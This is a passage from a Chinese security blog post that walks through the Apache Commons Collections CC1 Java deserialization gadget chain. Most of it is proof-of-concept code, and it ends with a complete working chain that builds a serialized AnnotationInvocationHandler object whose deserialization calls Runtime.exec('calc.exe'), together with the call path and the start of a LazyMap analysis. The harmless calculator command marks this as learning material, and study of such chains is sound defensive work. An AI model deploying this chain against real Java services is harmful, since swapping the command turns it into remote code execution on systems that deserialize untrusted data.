class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//        invokerTransformer.transform(Runtime.getRuntime());</span></span><br><span class="line">        </span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap=TransformedMap.decorate(hashMap,<span class="literal">null</span>, invokerTransformer);</span><br><span class="line">        hashMap.put(<span class="string">&quot;b1uel0n3&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line"><span class="comment">//        for(Map.Entry entry:transformedMap.entrySet())&#123;</span></span><br><span class="line"><span class="comment">//             entry.setValue(Runtime.getRuntime());</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        </span><br><span class="line">        Class cls=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        constructor.newInstance(Retention.class,transformedMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但这链子就已经完了，我们加上反序列化来调用readObject方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Annotation;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//        invokerTransformer.transform(Runtime.getRuntime());</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap=TransformedMap.decorate(hashMap,<span class="literal">null</span>, invokerTransformer);</span><br><span class="line">        hashMap.put(<span class="string">&quot;b1uel0n3&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line"><span class="comment">//        for(Map.Entry entry:transformedMap.entrySet())&#123;</span></span><br><span class="line"><span class="comment">//             entry.setValue(Runtime.getRuntime());</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        Class cls=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object o=constructor.newInstance(Retention.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而并没有弹出计算器，分析了一下发现之前我们都是将<code>Runtime.getRuntime()</code>传入setValue方法来执行<code>invokerTransformer.transform(Runtime.getRuntime());</code>，但上面的代码并没有传入也传入不了<code>Runtime.getRuntime()</code>。所以需要transformedMap执行checksetValue方法时本身就不需要传入<code>Runtime.getRuntime()</code>就能实现。</p><p>而执行exec方法可以通过执行多次InvokerTransformer.transform()方法实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">常规：</span><br><span class="line">Class cls=Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> m.invoke(cls);</span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">exec.invoke(runtime,<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">InvokerTransformer.transform()实现：    </span><br><span class="line">ConstantTransformer constant=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">exec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);   </span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">getRuntime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,</span><br><span class="line">Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);  </span><br><span class="line">InvokerTransformer invoke= <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line"></span><br><span class="line">Object cls=constant.transform(Runtime.class);             <span class="comment">//获得Runtime.class对象，传入的对象可以是任何Object</span></span><br><span class="line">Object method=getRuntime.transform(cls);  <span class="comment">//获取getRuntime方法，执行getMethod(&quot;getRuntime&quot;)</span></span><br><span class="line">Object runtime=invoke.transform(method);                  <span class="comment">//调用getRuntime方法，执行Method.invoke(null, null)</span></span><br><span class="line">exec.transform(runtime);                                  <span class="comment">//调用exec方法，弹计算机</span></span><br></pre></td></tr></table></figure><p>而Runtime对象的获得通过ConstantTransformer类重写的transform方法得到，该方法能够返回传入的对象：</p><p><img src="/archives/186141d8/image-20250616143702935.png" alt="image-20250616143702935"></p><p><img src="/archives/186141d8/image-20250616113056868.png" alt="image-20250616113056868"></p><p>所以我们需要找到一个继承了transformer接口的类，里面重写的transform方法能够执行多个其他类的transform方法，这不，经过不懈搜索，发现恰好有一个类正好满足，就是<strong>ChainedTransformer</strong>类：</p><p><img src="/archives/186141d8/image-20250616141046053.png" alt="image-20250616141046053"></p><p>可以看到，它重写的transform方法会遍历iTransformers变量中的所有Transformer对象，并执行该对象中重写的transform方法，参数为object，并将结果赋值给object，正好符合我们的需求。而且通过它的构造方法可以看到iTransformers变量是我们可控的，那么上面exec的实现就可以写成：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ConstantTransformer constant=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">exec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">getRuntime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,</span><br><span class="line">Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">InvokerTransformer invoke= <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line"><span class="comment">//Object cls=constant.transform(Runtime.class); </span></span><br><span class="line"><span class="comment">//Object method=getRuntime.transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//Object runtime=invoke.transform(method);</span></span><br><span class="line"><span class="comment">//exec.transform(method);</span></span><br><span class="line"></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;constant, getRuntime, invoke, exec&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chained</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">chained.transform(Object.class);</span><br></pre></td></tr></table></figure><p>修改下poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Annotation;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ConstantTransformer constant=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">exec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">getRuntime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer invoke= <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line"><span class="comment">//      Object cls=constant.transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//      Object method=getRuntime.transform(Runtime.class);</span></span><br><span class="line"><span class="comment">//      Object runtime=invoke.transform(method);</span></span><br><span class="line"><span class="comment">//      exec.transform(method);</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;constant, getRuntime, invoke, exec&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chained</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap=TransformedMap.decorate(hashMap,<span class="literal">null</span>, chained);</span><br><span class="line">        hashMap.put(<span class="string">&quot;b1uel0n3&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line"><span class="comment">//        for(Map.Entry entry:transformedMap.entrySet())&#123;</span></span><br><span class="line"><span class="comment">//             entry.setValue(Runtime.getRuntime());</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        Class cls=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object o=constructor.newInstance(Retention.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依旧没弹计算机，在readObject的setValue处下个断点:<br><img src="/archives/186141d8/image-20250616152430138.png" alt="image-20250616152430138"></p><p>结果发现根本没有执行setValue方法，于是我看了下执行的条件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">memberType != <span class="literal">null</span></span><br><span class="line">!(memberType.isInstance(value) ||value <span class="keyword">instanceof</span> ExceptionProxy)</span><br></pre></td></tr></table></figure><p><img src="/archives/186141d8/image-20250616153257240.png" alt="image-20250616153257240"></p><p>memeberType是注解接口中定义的所有成员（方法）及其返回类型的映射，第一点<code>memberType != null</code>，即当前处理的成员名称必须在原注解接口中有定义，所以我们添加的键值对键名应该是Retention注解类中所定义的：</p><p><img src="/archives/186141d8/image-20250616153648147.png" alt="image-20250616153648147"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br></pre></td></tr></table></figure><p>第二点就是检查值是否匹配注解成员声明的类型和检查是否为注解解析失败的占位符，这些都是满足的</p><p>完整CC1链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ConstantTransformer constant=<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">exec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">getRuntime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer invoke= <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;constant, getRuntime, invoke, exec&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chained</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap=TransformedMap.decorate(hashMap,<span class="literal">null</span>, chained);</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; cls= Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object o=constructor.newInstance(Retention.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/186141d8/image-20250616154148194.png" alt="image-20250616154148194"></p><p>成功弹计算机</p><p>完整利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream -&gt; readObject()</span><br><span class="line">AnnotationInvocationHandler -&gt; readObject()</span><br><span class="line">AbstractInputCheckedMapDecorator -&gt; setValue()</span><br><span class="line">TransformedMap -&gt; checkSetValue()</span><br><span class="line">ChainedTransformer -&gt; transform()</span><br><span class="line">ConstantTransformer -&gt; transform()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure><h3 id="LazyMap链分析"><a href="#LazyMap链分析" class="headerlink" title="LazyMap链分析"></a>LazyMap链分析</h3><p>LazyMap与TransformedMap类似，都来自commons collections库，并且继承AbstractMapDecorator类：</p><p><img src="/archives/186141d8/image-20250616155705540.png" 